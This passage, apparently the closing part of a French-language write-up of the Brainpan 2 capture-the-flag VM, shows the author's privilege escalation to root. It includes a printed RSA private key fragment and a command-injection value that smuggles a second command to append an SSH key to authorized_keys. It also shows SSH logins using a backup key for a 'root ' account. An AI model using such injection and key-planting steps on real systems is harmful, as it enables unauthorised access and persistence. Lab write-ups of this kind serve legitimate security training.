T8ITH/2a3N6AvjxnMBLPXsgmeJCS64XPBBndkWbeKwl/FS5OCWZ180CBi8fgeMmP
QDO1tbiHUbOfL5E+yYCprslyZ94vf/oE1Fb37UvcZ/5avJIpQBs7PPQQugbX3TpG
M/L/LwC0Mk80CevDwSYfDgMupHZ2HDkVxLSw56NNwUS2WCOmSnK48q7xYHt7VjfR
h70jSTd7a/abnWbbJQEq47JIvuL4ScdQezE+r3LvpYFVaYBjsUWmf7kskMs1jyj3
-----END RSA PRIVATE KEY-----
```

Malheureusement la clé privée est protégée par une passphrase, impossible de l'utiliser.  

Solution : on envoie nos clés publiques / privées sur le serveur puis on exploite VIEW pour ajouter la clé publique dans les clés autorisées de *puck* :

```plain
                          >> VIEW
    ENTER FILE TO DOWNLOAD: /dev/null;cat /tmp/id_rsa.pub >> /home/puck/.ssh/authorized_keys
```

On se connecte au serveur SSH local (notez que l'adresse sur laquelle écoute le serveur SSH est une autre blague) :  

```plain
root # ssh puck@127.0.1.1 -p 2222 -i /tmp/id_rsa 
Enter passphrase for key '/tmp/id_rsa': 
Linux brainpan2 3.2.0-4-686-pae #1 SMP Debian 3.2.51-1 i686

puck@brainpan2:~$ id
uid=1001(puck) gid=1001(puck) groups=1001(puck),50(staff)
```

That's all folks !
------------------

C'est bien on a maintenant les droits de *puck*... So what ? Il a un dossier caché *.backup* :  

```plain
./.backup:
total 28
drwxr-xr-x 3 puck puck 4096 Nov  5 09:44 .
drwx------ 4 puck puck 4096 Nov  5 09:45 ..
-rw------- 1 puck puck  395 Nov  5 09:43 .bash_history
-rw-r--r-- 1 puck puck  220 Nov  4 14:18 .bash_logout
-rw-r--r-- 1 puck puck 3392 Nov  4 14:18 .bashrc
-rw-r--r-- 1 puck puck  675 Nov  4 14:18 .profile
drwx------ 2 puck puck 4096 Nov  4 14:15 .ssh

./.backup/.ssh:
total 16
drwx------ 2 puck puck 4096 Nov  4 14:15 .
drwxr-xr-x 3 puck puck 4096 Nov  5 09:44 ..
-rw------- 1 puck puck 1675 Nov  4 14:15 id_rsa
-rw-r--r-- 1 puck puck  396 Nov  4 14:15 id_rsa.pub
```

Et dans l'historique sauvegardé :

```plain
ssh -l "root " brainpan2
(...)
mkdir .backup
mv .ssh .bash* .backup
```

Utilisons donc cette fameuse clé de backup :  

```plain
puck@brainpan2:~$ ssh -l "root " 127.0.1.1 -p 2222 -i .backup/.ssh/id_rsa
Linux brainpan2 3.2.0-4-686-pae #1 SMP Debian 3.2.51-1 i686

root @brainpan2:~# id
uid=0(root ) gid=0(root ) groups=0(root )
root @brainpan2:~# cat  /root/flag.txt 

                          !!! CONGRATULATIONS !!!

                 You've completed the Brainpan 2 challenge! 
                 Or have you...? 

                 Yes, you have! Pat yourself on the back. :-)

                 Questions, comments, suggestions for new VM
                 challenges? Let me know! 

                 Twitter: @superkojiman
                 Email  : contact@techorganic.com
                 Web    : http://www.techorganic.com
```

Finalement terminé ! Heureusement je suis pas cardiaque.

*Published March 13 2014 at 12:25*